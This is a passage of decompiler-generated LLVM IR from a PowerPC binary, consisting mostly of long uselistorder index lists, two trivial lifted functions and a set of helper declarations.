194, 195, 196, 197, 198, 199, 200, 201, 202, 40, 41, 212, 213, 214, 215, 216, 142, 143, 144, 218, 219, 145, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 10, 248, 11, 249, 250, 12, 251, 13, 252, 253, 146, 147, 270, 148, 271, 149, 150, 272, 273, 151, 284, 285, 96, 95, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 98, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 97, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 152, 37, 153, 38, 368, 99, 100, 101 }
  uselistorder i32 1, { 361, 544, 1218, 709, 710, 833, 832, 84, 80, 83, 82, 79, 81, 836, 835, 834, 15, 0, 1085, 1086, 1087, 1088, 603, 16, 47, 48, 50, 51, 49, 93, 207, 837, 180, 181, 350, 411, 545, 546, 839, 838, 503, 502, 504, 500, 499, 501, 498, 505, 711, 73, 74, 76, 75, 840, 321, 107, 712, 841, 40, 38, 37, 39, 713, 635, 1222, 1219, 845, 844, 843, 842, 105, 103, 100, 104, 102, 101, 714, 1221, 846, 983, 984, 985, 708, 986, 604, 41, 42, 44, 43, 45, 7, 8, 9, 10, 11, 13, 14, 12, 92, 581, 847, 535, 1220, 543, 715, 716, 850, 849, 848, 201, 198, 199, 200, 197, 202, 194, 636, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 952, 865, 864, 507, 508, 867, 866, 53, 52, 54, 1227, 1228, 166, 164, 167, 165, 434, 435, 430, 433, 432, 431, 1223, 1224, 1225, 1226, 553, 552, 551, 868, 717, 869, 56, 55, 57, 718, 870, 195, 196, 637, 871, 58, 203, 320, 541, 410, 497, 77, 506, 179, 204, 872, 206, 78, 511, 542, 534, 540, 106, 873, 303, 874, 205, 953, 875, 349, 1130, 1131, 572, 573, 585, 1132, 1133, 580, 1134, 878, 877, 876, 71, 65, 68, 69, 72, 70, 67, 66, 1, 1135, 1136, 1137, 1138, 1139, 2, 1141, 1140, 1142, 1143, 1144, 1145, 562, 1146, 1147, 880, 879, 994, 995, 996, 719, 997, 88, 89, 90, 91, 1148, 1149, 606, 605, 1150, 94, 1151, 1153, 1152, 720, 1154, 574, 548, 547, 549, 1120, 85, 86, 1155, 1156, 575, 576, 586, 1157, 61, 62, 63, 64, 1158, 554, 555, 556, 557, 558, 559, 560, 561, 1159, 426, 429, 428, 427, 1160, 96, 99, 98, 97, 59, 60, 587, 653, 1089, 1090, 652, 651, 638, 1091, 721, 1092, 1093, 722, 1094, 1095, 1096, 723, 724, 1100, 1097, 1098, 1099, 1102, 725, 1103, 726, 727, 1111, 728, 729, 1112, 639, 730, 731, 640, 641, 732, 733, 734, 735, 642, 736, 737, 738, 739, 643, 644, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 645, 646, 647, 648, 649, 753, 754, 755, 756, 650, 757, 1118, 1119, 623, 823, 824, 888, 887, 886, 885, 884, 883, 882, 881, 532, 525, 524, 523, 526, 529, 521, 520, 519, 512, 513, 518, 517, 516, 515, 514, 531, 522, 530, 533, 528, 527, 1113, 1114, 758, 1115, 1116, 759, 1117, 177, 168, 171, 173, 175, 174, 176, 170, 169, 178, 172, 1101, 760, 509, 510, 584, 963, 964, 968, 965, 971, 966, 563, 564, 967, 582, 565, 566, 577, 567, 568, 969, 970, 583, 569, 570, 578, 972, 761, 973, 974, 762, 975, 976, 977, 980, 981, 978, 979, 588, 982, 654, 896, 895, 894, 893, 892, 825, 891, 890, 889, 317, 312, 310, 304, 311, 314, 313, 307, 305, 306, 308, 319, 316, 315, 318, 309, 1076, 763, 589, 539, 537, 538, 536, 1010, 1013, 1011, 1012, 764, 897, 20, 17, 18, 25, 30, 31, 29, 24, 23, 22, 19, 21, 28, 27, 26, 656, 954, 955, 655, 956, 765, 766, 767, 958, 959, 957, 607, 960, 768, 769, 770, 961, 771, 624, 962, 772, 909, 908, 827, 907, 826, 830, 906, 905, 904, 903, 902, 901, 900, 899, 898, 35, 33, 32, 34, 36, 550, 773, 658, 657, 608, 911, 910, 774, 614, 987, 778, 775, 988, 776, 989, 777, 990, 991, 992, 579, 779, 993, 780, 781, 782, 783, 784, 785, 625, 922, 921, 920, 919, 918, 917, 916, 915, 914, 913, 912, 355, 357, 360, 351, 352, 353, 358, 356, 354, 359, 998, 786, 999, 1000, 1001, 1002, 1003, 4, 609, 1004, 1005, 3, 1006, 1007, 1008, 1009, 925, 924, 828, 829, 923, 109, 108, 1104, 1107, 1105, 610, 1106, 87, 1108, 1109, 1110, 787, 788, 1014, 1015, 1016, 1017, 1018, 1019, 1022, 1020, 1021, 1023, 1024, 1025, 789, 1026, 590, 626, 1027, 1028, 1029, 611, 1030, 1031, 928, 927, 926, 447, 436, 445, 437, 452, 461, 451, 459, 454, 455, 456, 457, 446, 458, 460, 441, 442, 462, 463, 464, 449, 448, 465, 450, 453, 444, 443, 440, 439, 438, 1032, 1033, 1034, 790, 591, 627, 1035, 930, 929, 325, 323, 334, 342, 343, 336, 344, 338, 329, 347, 339, 335, 345, 346, 337, 340, 331, 341, 328, 327, 326, 322, 324, 348, 333, 332, 330, 1036, 1037, 791, 1038, 1039, 1040, 792, 793, 628, 1041, 659, 660, 931, 224, 219, 212, 221, 230, 208, 209, 233, 223, 225, 226, 228, 217, 220, 231, 232, 218, 222, 227, 229, 214, 213, 234, 216, 215, 210, 211, 1042, 663, 1043, 1044, 661, 1045, 794, 795, 662, 932, 246, 237, 235, 247, 245, 248, 239, 242, 243, 244, 238, 241, 240, 236, 1046, 666, 1047, 1048, 664, 1049, 796, 797, 665, 933, 423, 414, 412, 424, 422, 425, 416, 419, 420, 421, 415, 418, 417, 413, 1050, 1051, 1052, 1053, 798, 592, 629, 1054, 667, 668, 934, 302, 292, 299, 296, 300, 293, 294, 291, 278, 289, 290, 286, 287, 288, 284, 285, 281, 282, 280, 279, 283, 295, 301, 277, 276, 297, 298, 1055, 1056, 1057, 799, 593, 630, 1058, 669, 670, 671, 935, 394, 391, 395, 405, 385, 387, 397, 396, 408, 398, 392, 406, 407, 402, 403, 404, 400, 393, 401, 399, 409, 390, 389, 388, 386, 1059, 1060, 1061, 1062, 800, 594, 631, 1063, 672, 673, 674, 675, 676, 677, 678, 679, 680, 939, 938, 937, 936, 370, 365, 374, 380, 363, 367, 377, 368, 378, 375, 379, 381, 382, 383, 371, 366, 364, 384, 376, 369, 373, 372, 362, 1064, 1065, 1066, 1067, 801, 595, 632, 1068, 681, 682, 683, 684, 685, 943, 942, 941, 940, 261, 256, 265, 271, 254, 258, 268, 259, 269, 266, 270, 272, 273, 274, 262, 257, 255, 275, 267, 260, 264, 263, 253, 1069, 1070, 1071, 1073, 1074, 1072, 596, 633, 1075, 686, 687, 688, 944, 152, 139, 150, 159, 138, 137, 154, 162, 157, 155, 148, 140, 156, 160, 161, 144, 145, 153, 151, 158, 141, 163, 149, 147, 146, 142, 143, 1077, 1078, 1079, 1081, 1082, 1080, 597, 634, 1083, 689, 690, 691, 949, 948, 947, 946, 945, 124, 133, 134, 120, 135, 136, 121, 123, 119, 116, 114, 126, 128, 125, 117, 118, 110, 111, 115, 129, 122, 131, 127, 113, 112, 132, 130, 5, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 1084, 702, 703, 251, 250, 249, 252, 598, 95, 599, 6, 1121, 802, 1125, 803, 1126, 1122, 1123, 1124, 1127, 1128, 185, 189, 193, 182, 192, 183, 188, 187, 186, 184, 191, 190, 1129, 804, 600, 46, 1161, 1162, 704, 1163, 1164, 612, 1165, 1166, 571, 615, 809, 616, 617, 808, 618, 812, 619, 1167, 705, 620, 810, 621, 622, 811, 613, 1168, 1169, 807, 1170, 1171, 1172, 1173, 1174, 1175, 820, 821, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 806, 1185, 1186, 1187, 1188, 1189, 1190, 813, 814, 815, 1191, 1192, 1193, 1194, 1195, 1196, 816, 1197, 1198, 1199, 1200, 817, 1201, 1202, 1203, 1204, 818, 1205, 819, 1206, 1207, 1208, 601, 805, 706, 1209, 1210, 602, 1211, 1212, 1213, 822, 1214, 1215, 1216, 1217, 707, 951, 950, 487, 494, 479, 470, 493, 488, 486, 485, 480, 481, 471, 483, 484, 472, 482, 473, 474, 475, 476, 477, 478, 492, 496, 495, 467, 491, 490, 489, 469, 468, 466, 831 }
  uselistorder label %dec_label_pc_1000dd9c, { 1, 0 }
}

define i32 @function_1000ddc4() local_unnamed_addr {
dec_label_pc_1000ddc4:
  %v0_1000dddc = load i32, i32* @r3, align 4
  ret i32 %v0_1000dddc

; uselistorder directives
  uselistorder i32* @r3, { 22, 11, 252, 253, 254, 13, 115, 0, 116, 32, 262, 21, 16, 3, 25, 255, 257, 31, 258, 259, 260, 178, 29, 179, 9, 14, 193, 198, 197, 256, 83, 199, 84, 85, 200, 26, 17, 23, 261, 117, 118, 119, 120, 121, 122, 123, 124, 125, 12, 30, 4, 20, 201, 1, 2, 5, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 180, 181, 185, 186, 187, 190, 191, 192, 182, 6, 183, 184, 96, 97, 28, 98, 99, 100, 15, 170, 171, 172, 10, 173, 174, 7, 140, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 101, 19, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 188, 189, 8, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 175, 176, 177, 202, 194, 195, 196, 203, 204, 205, 206, 208, 209, 207, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 24, 18, 27 }
}

define i32 @function_1000dde0() local_unnamed_addr {
entry:
  store i32 268492272, i32* @lr, align 4
  %v0_1000ddec = call i32 @function_100000b8()
  ret i32 %v0_1000ddec

; uselistorder directives
  uselistorder i32 0, { 1147, 250, 1148, 42, 251, 177, 1151, 252, 1152, 1153, 40, 41, 1154, 1155, 1156, 72, 1157, 0, 783, 784, 785, 91, 90, 786, 589, 253, 254, 790, 917, 918, 178, 919, 1158, 17, 590, 591, 1159, 1160, 1161, 1162, 255, 592, 593, 594, 595, 596, 597, 598, 92, 599, 600, 1163, 1164, 256, 1182, 1183, 257, 1188, 1197, 170, 1198, 258, 1189, 1, 1165, 1166, 93, 1167, 1168, 259, 179, 260, 1169, 1170, 45, 46, 1171, 1172, 1173, 261, 1176, 1177, 1178, 43, 44, 1179, 1180, 1181, 558, 559, 560, 561, 562, 94, 563, 564, 565, 248, 566, 95, 922, 924, 21, 925, 47, 926, 923, 920, 921, 2, 795, 791, 792, 793, 794, 171, 3, 929, 927, 928, 172, 930, 931, 796, 797, 798, 799, 800, 262, 801, 802, 896, 897, 263, 898, 180, 932, 941, 942, 96, 933, 934, 935, 936, 937, 938, 939, 940, 4, 5, 486, 494, 495, 496, 48, 49, 497, 6, 264, 787, 498, 499, 500, 501, 502, 503, 504, 505, 265, 506, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 943, 944, 50, 945, 946, 947, 948, 949, 1190, 1191, 1192, 51, 1193, 1194, 1195, 1196, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 507, 567, 950, 1174, 1175, 508, 951, 613, 630, 509, 1184, 97, 1185, 1149, 913, 1150, 914, 952, 510, 1186, 1187, 511, 512, 953, 954, 955, 52, 98, 956, 957, 249, 958, 960, 959, 176, 7, 961, 76, 22, 77, 23, 962, 963, 8, 78, 24, 79, 25, 964, 80, 965, 26, 27, 966, 81, 28, 99, 266, 267, 18, 19, 614, 967, 968, 969, 970, 103, 101, 100, 971, 102, 105, 104, 972, 106, 973, 53, 974, 975, 976, 899, 107, 900, 901, 977, 978, 54, 108, 979, 9, 109, 980, 110, 981, 803, 804, 805, 114, 806, 807, 808, 809, 167, 810, 268, 811, 812, 816, 813, 112, 493, 814, 113, 815, 269, 817, 818, 819, 820, 821, 115, 822, 823, 181, 824, 825, 487, 82, 826, 827, 828, 829, 830, 831, 57, 58, 832, 833, 55, 56, 834, 835, 182, 183, 836, 837, 270, 838, 840, 841, 842, 843, 844, 184, 185, 849, 850, 271, 851, 845, 846, 847, 848, 852, 20, 488, 489, 858, 859, 111, 860, 861, 862, 867, 868, 869, 870, 186, 871, 872, 116, 873, 874, 875, 876, 877, 878, 863, 117, 864, 865, 118, 866, 272, 839, 85, 538, 539, 29, 273, 83, 30, 31, 274, 84, 32, 540, 10, 190, 189, 541, 542, 543, 544, 545, 546, 188, 187, 547, 59, 60, 548, 549, 275, 119, 550, 551, 120, 552, 121, 553, 122, 554, 555, 631, 632, 633, 634, 635, 636, 637, 638, 639, 513, 514, 168, 515, 516, 517, 276, 518, 519, 520, 521, 522, 523, 524, 525, 191, 526, 527, 61, 62, 528, 529, 530, 63, 64, 531, 532, 533, 11, 534, 535, 536, 277, 278, 537, 556, 192, 557, 569, 124, 568, 123, 570, 571, 126, 572, 125, 573, 574, 128, 575, 127, 576, 577, 130, 578, 129, 579, 580, 132, 581, 131, 582, 12, 279, 280, 16, 585, 583, 584, 173, 586, 587, 193, 281, 282, 283, 588, 33, 615, 626, 616, 13, 617, 618, 619, 620, 174, 621, 622, 623, 624, 625, 34, 133, 71, 70, 134, 627, 65, 286, 628, 284, 285, 194, 629, 87, 853, 854, 86, 855, 135, 856, 88, 857, 136, 640, 641, 287, 642, 643, 138, 137, 644, 288, 645, 646, 647, 648, 649, 650, 651, 139, 652, 653, 654, 195, 655, 656, 289, 657, 73, 74, 658, 140, 659, 660, 661, 290, 196, 197, 198, 199, 141, 662, 291, 663, 664, 665, 666, 292, 667, 668, 669, 201, 200, 670, 293, 671, 672, 673, 674, 675, 142, 676, 294, 677, 678, 679, 680, 681, 295, 682, 683, 684, 202, 203, 204, 205, 146, 145, 685, 686, 296, 35, 144, 143, 687, 688, 689, 297, 36, 690, 691, 692, 693, 147, 206, 151, 150, 694, 695, 37, 149, 148, 696, 697, 698, 38, 699, 700, 701, 702, 152, 207, 703, 153, 704, 298, 705, 706, 707, 299, 708, 709, 710, 711, 300, 712, 713, 714, 208, 209, 210, 211, 212, 213, 214, 215, 715, 716, 154, 717, 718, 301, 719, 720, 721, 722, 723, 724, 302, 725, 726, 727, 224, 216, 217, 218, 219, 220, 221, 222, 223, 155, 728, 729, 303, 730, 731, 732, 733, 736, 737, 304, 735, 734, 305, 738, 739, 740, 225, 226, 227, 156, 741, 742, 306, 743, 744, 745, 746, 749, 750, 307, 748, 747, 308, 751, 752, 753, 228, 229, 230, 231, 232, 233, 234, 754, 157, 755, 309, 756, 757, 758, 759, 760, 761, 762, 763, 764, 310, 765, 766, 767, 235, 236, 237, 238, 768, 158, 769, 311, 770, 771, 772, 773, 774, 775, 776, 777, 778, 312, 779, 780, 781, 239, 240, 241, 242, 782, 982, 983, 788, 789, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 159, 893, 313, 894, 895, 902, 75, 903, 904, 314, 905, 906, 907, 908, 909, 910, 911, 912, 915, 39, 916, 984, 317, 989, 990, 991, 992, 986, 987, 988, 985, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 318, 1009, 1010, 1011, 1012, 315, 1013, 1014, 175, 1015, 1016, 89, 160, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 162, 1025, 1026, 1027, 1028, 1029, 1030, 1043, 1044, 1045, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1046, 321, 1047, 1048, 1049, 1050, 1051, 161, 1052, 1053, 1054, 1055, 316, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 319, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 320, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 165, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 163, 1113, 1115, 1114, 1116, 1117, 1118, 1119, 1120, 243, 164, 1121, 1122, 1123, 1124, 244, 1125, 322, 323, 1126, 1127, 1128, 1129, 1130, 66, 67, 1131, 1132, 68, 69, 1133, 1134, 169, 1135, 166, 1136, 1137, 1138, 324, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 245, 1146, 246, 247, 1207, 1208, 1209, 15, 14, 490, 491, 492, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232 }
  uselistorder i32* @lr, { 7, 801, 944, 945, 949, 950, 951, 952, 953, 954, 652, 117, 323, 324, 8, 802, 803, 325, 326, 327, 328, 329, 330, 963, 964, 968, 969, 970, 971, 972, 973, 975, 977, 965, 967, 955, 956, 957, 958, 959, 960, 961, 962, 804, 806, 805, 655, 656, 657, 658, 659, 660, 784, 785, 786, 807, 811, 808, 809, 810, 118, 119, 946, 947, 948, 812, 813, 661, 814, 662, 815, 250, 816, 663, 817, 466, 120, 653, 121, 122, 123, 124, 125, 126, 127, 976, 974, 664, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 966, 128, 129, 665, 666, 667, 668, 345, 818, 819, 787, 820, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 821, 822, 669, 670, 671, 672, 673, 674, 109, 110, 111, 112, 113, 114, 115, 116, 675, 676, 677, 678, 679, 680, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 759, 760, 761, 762, 763, 764, 765, 770, 771, 772, 773, 751, 752, 753, 754, 755, 756, 757, 758, 681, 682, 683, 684, 685, 686, 130, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 389, 766, 767, 768, 769, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 0, 269, 270, 271, 272, 273, 274, 275, 276, 277, 294, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 2, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 3, 374, 375, 376, 377, 378, 379, 1, 380, 381, 382, 383, 384, 385, 386, 387, 388, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 452, 453, 454, 451, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 467, 469, 470, 471, 468, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 823, 654, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 824, 825, 826, 827, 830, 831, 832, 833, 828, 829, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 849, 848, 4, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 5, 6 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr
